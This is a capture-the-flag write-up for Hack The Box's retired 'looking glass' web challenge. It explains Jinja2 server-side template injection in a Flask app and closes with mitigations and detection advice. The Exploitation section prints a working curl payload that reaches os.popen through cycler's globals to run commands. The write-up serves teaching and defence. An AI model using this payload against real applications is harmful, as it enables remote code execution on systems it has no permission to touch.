---
challenge: looking glass
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, flask, ssti, jinja2, rce]
---

# looking glass — Hack The Box (Challenge)

**English** | [🇪🇸 Español](README.md)

> **Status:** Retired. Reference writeup; no real flag.

## TL;DR

A Flask application reflects a parameter into a Jinja2 template. The `{{7*7}}` expression confirms server-side template injection, and Jinja's object chain allows command execution and flag retrieval.

## Statement and surface

- Web, Easy, retired.
- A URL is provided with a page that behaves like a mirror.
- The input parameter is rendered in the response.

```bash
curl -s -I http://<IP>:<PORT>/
curl -s 'http://<IP>:<PORT>/?=test'
```

## Reconnaissance

```bash
curl -s 'http://<IP>:<PORT>/?={{7*7}}'
```

- The response returns `49`, not the literal text.
- The server is Flask/Werkzeug.
- There is no authentication or complex form.

## Code analysis

The application passes input to `render_template_string` or concatenates it into a template. Jinja2 evaluates expressions between `{{ }}`; the context exposes Python objects reachable through `cycler`, `lipsum`, `joiner` or `config`.

## Flaw explanation

User input is treated as template code instead of data. This is not XSS: evaluation happens on the server and can reach `os.popen` or `subprocess.Popen` through Python's class chain.

## Local reproduction

```bash
python3 -m flask --app app run
# Test the expression and payload locally
```

## Exploitation

```bash
curl -s 'http://<IP>:<PORT>/?={{7*7}}'
curl -s 'http://<IP>:<PORT>/?={{cycler.__init__.__globals__.os.popen("id").read()}}'
```

Locate the flag in the application directory or root and redact it.

## Evidence

- `{{7*7}}` returning `49`.
- `id` executed from the template.
- Flag read without publishing its value.

## Lessons learned

- A template engine must not receive user-supplied templates.
- `{{7*7}}` is a quick, low-impact test.
- Jinja's context can be enough for RCE.

## Mitigations and detection

- Pass input as a variable, not as a template.
- Use a Jinja sandbox and disable dangerous objects.
- Alert on `{{`, `{%` expressions and template errors in logs.
- References: OWASP SSTI, PortSwigger, HTB looking glass.

## References

- <https://www.hackthebox.com/challenges/looking%20glass>
- <https://7rocky.github.io/en/ctf/htb-challenges/web/looking-glass/>
- <https://owasp.org/www-community/attacks/Server-Side_Template_Injection>
- <https://attack.mitre.org/techniques/T1190/>
